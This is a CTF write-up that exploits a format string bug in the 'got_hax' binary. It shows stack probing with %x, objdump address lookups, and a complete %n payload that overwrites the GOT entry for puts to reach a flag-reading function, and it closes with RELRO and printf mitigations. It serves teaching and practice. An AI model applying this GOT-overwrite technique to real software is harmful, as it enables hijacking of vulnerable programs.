# got_hax

## Introduction

I'm not sure where this pwnable came from, but it's certainly a fun one.

## Information Gathering

### Hint #1

> `printf` looks fishy.

### Hint #2

> What does GOT stand for?

### Exploitation Mitigations

```shell
checksec ./got_hax
[*] '/home/bluebyte/Developer/random-pwnables/got_hax/got_hax'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

### Dynamic

If we run the program we get the following:

```shell
$ ./got_hax 10
On a scale of 1 to 10, how sweet are your hax?
$ 10
So you say you got hax...but not enough to get the flag!
Goodbye 10Sorry, try again.
```

### Static

We threw the program in Ghidra and this was the result after some cleanup.

```c
int main(int argc,char **argv)
{
  uint hax_num;
  char username [39];
  undefined local_11;
  undefined4 *local_10;

  local_10 = &argc;
  hax_num = 0;
  if (argc == 2) {
    puts("On a scale of 1 to 10, how sweet are your hax?");
    __isoc99_scanf("%u",&hax_num);
    /* hax_num must be less than 11. This makes sense since it asks for 1..10. */
    if ((hax_num < L'\v') && (hax_num != 0)) {
      puts("So you say you got hax...but not enough to get the flag!");
      strncpy(username,argv[1],39);
      local_11 = 0;
      printf("Goodbye ");
      printf(username);
      puts("Sorry, try again.");
    }
    else {
      puts("Can you read? That\'s not even on the scale!");
    }
  }
  else {
    puts("Usage: ./got_hax [name]");
  }
  return 0;
}
```

The thing to note here is that there is a `printf` vulnerability where user
controlled input ends up being printed without proper sanitization. If we pass
in a username of, say, `%s%s%s%s%s%s%s` we should get a segmentation fault as
`printf` takes arguments off of the stack and treats them as character
pointers. Since the values at these addresses probably aren't all valid
pointers, we should get a crash. We see this when we test the following:

```c
$ ./got_hax %s%s%s%s%s
On a scale of 1 to 10, how sweet are your hax?
$ 1
So you say you got hax...but not enough to get the flag!
Segmentation fault (core dumped)
```

We also noticed that right above `main` in Ghidra was the function
`get_your_flag`. This function `open`'s the `key` file, `read`'s the file, and
`printf`'s the result. Somehow, we need to call this function.

## Strategy

The idea is to overwrite the GOT entry for `puts` (which is called immediately
after the `printf` that has our username) with the address for `get_your_flag`
from our symbol table. We can do this with the `%n` conversion character. This
character will store the number of characters written so far into the integer
that is pointed to by the corresponding argument. To do this, we need to know a
few things (note, I really recommend reading `man 3 printf` first):

1. Where our input lies on the stack. We need this because we will be treating
that input as a `int *` and writing the address of `get_your_flag` to this
location. We will call this number `offset_on_stack`. To figure this out we can
do one of two things:

    - Debug the program and look at the stack. This would work well for this
challenge, as we have the executable. We'll skip this for now though.

    - We can write a format string that walks up the stack with a few `%x` and
examine the output. We try this with something like the following:

      ```shell
      $ ./got_hax "aaaa|%x|%x|%x|%x|%x|%x|%x"
      On a scale of 1 to 10, how sweet are your hax?
      10
      So you say you got hax...but not enough to get the flag!
      Goodbye aaaa|ffb2aa74|27|0|f7f53fd0|a|61616161|7c78257cSorry, try again.
      ```

      This format string tells `printf` to write `aaaa` and examine the stack
for seven arguments and treat them as unsigned hexadecimal numbers. Notice that
the sixth argument (not seventh - remember, the `aaaa` printed out first isn't
popped from the stack) is 0x61616161, which is the hexadecimal representation
of `aaaa`. This is where our input is on the stack.

1. The number of bytes we need to write. This one is easy; we need to write as
many bytes as is equal to the address (in decimal) of the thing we want to
write - the address of `get_your_flag`. We can get this easily with Ghidra or
`objdump`. This is not a position independent executable which helps us out
here.

    ```shell
    objdump --syms ./got_hax/got_hax | grep "get_your_flag"
    0804856b g     F .text  000000aa              get_your_flag
    ```

1. The address that we need to overwrite. This one is also easy. We want to
overwrite the GOT address that the dynamic linker resolves for `puts`. We can
also find this with `objdump`:

    ```shell
    objdump --dynamic-reloc ./got_hax/got_hax | grep "puts"
    08049ab4 R_386_JUMP_SLOT   puts@GLIBC_2.0
    ```

Alright, with all of these things, we can craft a format string that will write
the address of `get_your_flag` to the GOT entry for `puts`. We can do this by
using the `%n` conversion character. It will look something like this:

```
<address we want to write to>%<number_of_bytes_to_write>x%<offset_on_stack>$n
or, if we fill in some values:
<0x08049ab4>%<0x0804856b>x%<6>$n
```

A few problems. We're dealing with a little-endian architecture, so we need to
swap that first address to `b'\xb4\x9a\x04\x08`. Easy.

The next address represents the number of bytes we want to write as padding.
However, we've actually already written four bytes when we wrote the preceding
address (`b'\xb4\x9a\x04\x08`), so we need to subtract those four bytes. Then
we need to convert it to decimal. `134514023`.

So we're left with the following format string:
`\xb4\x9a\x04\x08%134514023x%6$n`

Breaking down what this means one last time:

`\xb4\x9a\x04\x08`: The address we want to write to. This will be the first
thing written to the offset we found on the stack. Thus when we later specify
`%n`, `printf` will look at this address and write the number of bytes we want
to write there.

`%134514023x`: We want to print one hexadecimal value with `134514023` bytes of
padding.

`%6$n` Take the sixth argument on the stack and write the number of characters
written so far to that address.

## The Solution (with a caveat)

We found what input we need to send the program that causes the program to read
the flag. If we send the input like so: `./got_hax
'\xb4\x9a\x04\x08%134514023x%6$n`, we will indeed get the flag, but it will
take a really long time. This is because the program will print to stdout all
of the padding we've told it to print. This is a long process. If we instead
send the input without printing any information (i.e, using the included
pwntools script), we avoid this long delay and it takes only a couple of
seconds:

```shell
$ python3 ./solve.py
...
[+] Flag: b'dc26c7327afc46f26307ed69ff79c3d5'
[*] Time: 2.48860764503479
```

We can further avoid this delay by writing the number of bytes in two distinct
chunks, but we will explore this in a future challenge. For now, let's roll
with our current solution!

## Mitigations

Some key terms. Inside an ELF there multiple section. A few of them are:

- `.got`: The table of offsets filled in by the dynamic linker to external
symbols. Think variables.

- `.plt`: Contains the stubs that look up the addresses to procedures in the
`.got.plt` or triggers the dynamic linker to resolve the procedure.

- `.got.plt`: Contains the addresses to procedures resolved by the dynamic
linker or the `.plt` to trigger the dynamic linker. Think functions. This is
merged into the `.got` section with Full RELRO; see below.

Join me in shaming the developers of this program. To prevent us from reading
the flag, the developers could have done a few things:

- Don't allow untrusted user input to the first argument of `printf`. `gcc`
will automatically trigger a warning at compile time if warnings are enabled.

- Compiled the executable with RELRO (relocations-read-only) enabled. There are
two versions of this:

  - Partial: the `.got` section is read-only, but the `.got.plt` section is
not. Rearrange sections to reduce global variable overflowing into control
structures. Unfortunately, this would not have prevented us from reading the
flag, as we overwrote the function pointer in the `.got.plt` section.

  - Full: everything above, plus: the dynamic linker resolves all symbols at
link time (before we've started executing) and updates the addresses in the
`.got` and `.got.plt` sections. Those two sections are then merged into one,
the `.got`, and you will no longer see the `.got.plt` section. The `.got` is
then `mprotect`'ed to be read-only. This would prevent us from reading the flag
as we would be unable to write to the `.got.plt` or `.got` sections after
link-time.

As of writing, `gcc` 11.2.1 defaults to compiling with Partial RELRO. To gain
the benefits of Full RELRO, add the compile option `-Wl -z,relro -z,now`.
